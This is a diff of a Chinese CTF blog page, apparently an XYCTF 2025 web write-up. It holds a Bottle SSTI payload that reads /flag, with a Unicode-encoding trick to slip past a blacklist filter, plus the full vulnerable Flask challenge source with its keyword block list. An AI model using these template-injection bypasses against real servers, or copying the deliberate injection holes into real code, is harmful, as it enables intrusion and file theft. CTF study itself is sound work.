+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">payload</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">25</span> <span class="ow">and</span> <span class="nb">all</span><span class="p">(</span><span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">payload</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">bottle</span><span class="o">.</span><span class="n">template</span><span class="p">(</span><span class="s1">&#39;hello &#39;</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bottle</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">400</span><span class="p">,</span> <span class="s1">&#39;Invalid payload&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bottle</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/LAMENTXU/articles/18805019"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p>
+<p><a class="link" href="https://www.cnblogs.com/LAMENTXU/articles/18730353"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p>
+<p>出题人讲的很详细，o用斜体字绕过waf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl"><span class="n">把open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="n">改成</span><span class="o">%</span><span class="n">bapen</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">re</span><span class="o">%</span><span class="n">aad</span><span class="p">()</span><span class="n">就行了</span> <span class="c1">#字符º，其URL编码后为%c2%ba，去掉%c2就可以被识别,字符a，同理。替换为%aa</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至于为什么去掉%c2问了问ai</p>
+<img src="image-20250507143949954.png" alt="image-20250507143949954" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">原始open(&#39;/flag&#39;).read()
+</span></span><span class="line"><span class="cl">编码变形%bapen(&#39;/flag&#39;).re%aad()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">解码过程：
+</span></span><span class="line"><span class="cl">%bapen → 0xBA pen → ºpen → open（视觉混淆）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="ezsql手动滑稽">ezsql(手动滑稽)
+</h2><h2 id="fate">Fate
+</h2><h2 id="now-you-see-me-1">Now you see me 1
+</h2><p>下载附件看到又base64编码字符解码看到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">@File    :   src.py
+</span></span></span><span class="line"><span class="cl"><span class="s1">@Time    :   2025/03/29 01:10:37
+</span></span></span><span class="line"><span class="cl"><span class="s1">@Author  :   LamentXU 
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">flask</span>  <span class="c1"># 导入Flask模块，用于创建Web应用</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>    <span class="c1"># 导入sys模块，用于系统相关的操作</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># 定义全局变量enable_hook，用于控制是否启用审计钩子</span>
+</span></span><span class="line"><span class="cl"><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>          <span class="c1"># 定义全局变量counter，用于记录触发审计钩子的次数</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">audit_checker</span><span class="p">(</span><span class="n">event</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>  <span class="c1"># 定义审计钩子函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">counter</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">enable_hook</span><span class="p">:</span>  <span class="c1"># 如果启用了审计钩子</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">event</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;compile&#34;</span><span class="p">]:</span>  <span class="c1"># 如果事件是exec或compile</span>
+</span></span><span class="line"><span class="cl">            <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>  <span class="c1"># 增加计数器</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">counter</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>  <span class="c1"># 如果计数器超过4</span>
+</span></span><span class="line"><span class="cl">                <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="n">event</span><span class="p">)</span>  <span class="c1"># 抛出RuntimeError异常</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义一个列表，包含许多被禁止的关键词和字符串，这些内容可能被用于危险操作或漏洞利用</span>
+</span></span><span class="line"><span class="cl"><span class="n">lock_within</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;debug&#34;</span><span class="p">,</span> <span class="s2">&#34;form&#34;</span><span class="p">,</span> <span class="s2">&#34;args&#34;</span><span class="p">,</span> <span class="s2">&#34;values&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;headers&#34;</span><span class="p">,</span> <span class="s2">&#34;json&#34;</span><span class="p">,</span> <span class="s2">&#34;stream&#34;</span><span class="p">,</span> <span class="s2">&#34;environ&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;files&#34;</span><span class="p">,</span> <span class="s2">&#34;method&#34;</span><span class="p">,</span> <span class="s2">&#34;cookies&#34;</span><span class="p">,</span> <span class="s2">&#34;application&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="s1">&#39;url&#39;</span> <span class="p">,</span><span class="s1">&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;getattr&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;{{&#34;</span><span class="p">,</span> <span class="s2">&#34;}}&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;[&#34;</span><span class="p">,</span> <span class="s2">&#34;]&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="s2">&#34;self&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;lipsum&#34;</span><span class="p">,</span> <span class="s2">&#34;cycler&#34;</span><span class="p">,</span> <span class="s2">&#34;joiner&#34;</span><span class="p">,</span> <span class="s2">&#34;namespace&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;init&#34;</span><span class="p">,</span> <span class="s2">&#34;dir&#34;</span><span class="p">,</span> <span class="s2">&#34;join&#34;</span><span class="p">,</span> <span class="s2">&#34;decode&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;batch&#34;</span><span class="p">,</span> <span class="s2">&#34;first&#34;</span><span class="p">,</span> <span class="s2">&#34;last&#34;</span> <span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34; &#34;</span><span class="p">,</span><span class="s2">&#34;dict&#34;</span><span class="p">,</span><span class="s2">&#34;list&#34;</span><span class="p">,</span><span class="s2">&#34;g.&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;subprocess&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;g|a&#34;</span><span class="p">,</span> <span class="s2">&#34;GLOBALS&#34;</span><span class="p">,</span> <span class="s2">&#34;lower&#34;</span><span class="p">,</span> <span class="s2">&#34;upper&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;BUILTINS&#34;</span><span class="p">,</span> <span class="s2">&#34;select&#34;</span><span class="p">,</span> <span class="s2">&#34;WHOAMI&#34;</span><span class="p">,</span> <span class="s2">&#34;path&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;nl&#34;</span><span class="p">,</span> <span class="s2">&#34;app&#34;</span><span class="p">,</span> <span class="s2">&#34;setattr&#34;</span><span class="p">,</span> <span class="s2">&#34;translate&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sort&#34;</span><span class="p">,</span> <span class="s2">&#34;base64&#34;</span><span class="p">,</span> <span class="s2">&#34;encode&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u&#34;</span><span class="p">,</span> <span class="s2">&#34;pop&#34;</span><span class="p">,</span> <span class="s2">&#34;referer&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;The closer you see, the lesser you find.&#34;</span> <span class="c1"># 作者的幽默注释</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>  <span class="c1"># 创建Flask应用实例</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义根路由，返回简单的欢迎信息</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;try /H3dden_route&#39;</span>  <span class="c1"># 提示用户尝试访问隐藏路由</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 定义隐藏路由，处理用户请求</span>
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/H3dden_route&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">r3al_ins1de_th0ught</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">enable_hook</span><span class="p">,</span> <span class="n">counter</span>  <span class="c1"># 使用全局变量</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;My_ins1de_w0r1d&#39;</span><span class="p">)</span>  <span class="c1"># 从请求参数中获取特定参数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">name</span><span class="p">:</span>  <span class="c1"># 如果获取到参数</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># 检查参数是否以特定前缀开头</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">name</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s2">&#34;Follow-your-heart-&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 检查参数是否包含禁止的关键词</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lock_within</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">name</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="k">return</span> <span class="s1">&#39;NOPE.&#39;</span>  <span class="c1"># 如果包含禁止内容，返回错误信息</span>
+</span></span><span class="line"><span class="cl">                <span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">True</span>  <span class="c1"># 启用审计钩子</span>
+</span></span><span class="line"><span class="cl">                <span class="c1"># 使用Flask的render_template_string方法渲染字符串内容</span>
+</span></span><span class="line"><span class="cl">                <span class="n">a</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template_string</span><span class="p">(</span><span class="s1">&#39;{#&#39;</span><span class="o">+</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">+</span><span class="s1">&#39;#}&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">enable_hook</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># 禁用审计钩子</span>
+</span></span><span class="line"><span class="cl">                <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># 重置计数器</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">a</span>  <span class="c1"># 返回渲染结果</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s1">&#39;My inside world is always hidden.&#39;</span>  <span class="c1"># 返回错误信息</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">RuntimeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  <span class="c1"># 捕获RuntimeError异常</span>
+</span></span><span class="line"><span class="cl">            <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># 重置计数器</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;NO.&#39;</span>  <span class="c1"># 返回错误信息</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  <span class="c1"># 捕获其他异常</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;Error&#39;</span>  <span class="c1"># 返回错误信息</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Welcome to Hidden_route!&#39;</span>  <span class="c1"># 返回欢迎信息</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 主程序入口</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">os</span>  <span class="c1"># 导入os模块</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 尝试导入并删除_posixsubprocess模块中的fork_exec函数</span>
+</span></span><span class="line"><span class="cl">        <span class="kn">import</span> <span class="nn">_posixsubprocess</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span> <span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>  <span class="c1"># 如果失败，忽略错误</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 删除os和subprocess模块中的多个函数，限制代码执行环境</span>
+</span></span><span class="line"><span class="cl">    <span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">call</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_call</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">getstatusoutput</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">TimeoutExpired</span>
+</span></span><span class="line"><span class="cl">    <span class="k">del</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">SubprocessError</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 添加审计钩子</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">addaudithook</span><span class="p">(</span><span class="n">audit_checker</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 启动Flask应用，指定主机和端口</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用requests 还有orgin和authorization构造rce</p>
+<p><a class="link" href="https://xz.aliyun.com/news/17697"  target="_blank" rel="noopener"
+    >ssti之Request浅析利用-先知社区</a></p>
+<p>利用requests 还有mimetype构造</p>
+<p><a class="link" href="https://www.mcso.top/en/computer/ctf/xyctf2025-now-you-see-me-1/"  target="_blank" rel="noopener"
+    >XYCTF2025 Now you see me 1 Writeup - Sky of Top</a></p>
+<p>下面出题人思路，有点看不懂</p>
+<p><a class="link" href="https://www.cnblogs.com/LAMENTXU/articles/18730353"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/LAMENTXU/articles/18730353</a></p>
+<p>下面是request文档</p>
+<p><a class="link" href="https://flask.palletsprojects.com/en/latest/api/#flask.Request"  target="_blank" rel="noopener"
+    >API — Flask Documentation (3.2.x)</a></p>
+
 </section>
 
 
@@ -566,12 +1174,12 @@
             
                 
 <article class="">
-    <a href="/p/2024-xyctf-web-%E5%A4%8D%E7%8E%B0/">
+    <a href="/p/2023-newstar-web/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2024-xyctf-web-复现</h2>
+            <h2 class="article-title">2023-newstar-web</h2>
         </div>
     </a>
 </article>
@@ -579,12 +1187,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-nss-%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
+    <a href="/p/2025-iscc-%E6%A0%A1%E8%B5%9B/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-nss-每日一题</h2>
+            <h2 class="article-title">2025-iscc-校赛</h2>
         </div>
     </a>
 </article>
@@ -592,12 +1200,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-tgctf-write.up/">
+    <a href="/p/2025-nss5%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-TGCTF-write.up</h2>
+            <h2 class="article-title">2025-nss5月每日一题</h2>
         </div>
     </a>
 </article>
@@ -605,12 +1213,12 @@
             
                 
 <article class="">
-    <a href="/p/2025-%E9%95%BF%E5%9F%8E%E6%9D%AF-ccforum/">
+    <a href="/p/2025-sqctf/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">2025-长城杯-ccforum</h2>
+            <h2 class="article-title">2025-sqctf</h2>
         </div>
     </a>
 </article>
@@ -618,12 +1226,12 @@
             
                 
 <article class="">
-    <a href="/p/nss-round28-web/">
+    <a href="/p/2025-nss-4%E6%9C%88%E4%BB%BD%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">nss-round28-web</h2>
+            <h2 class="article-title">2025-nss-4月份每日一题</h2>
         </div>
     </a>
 </article>
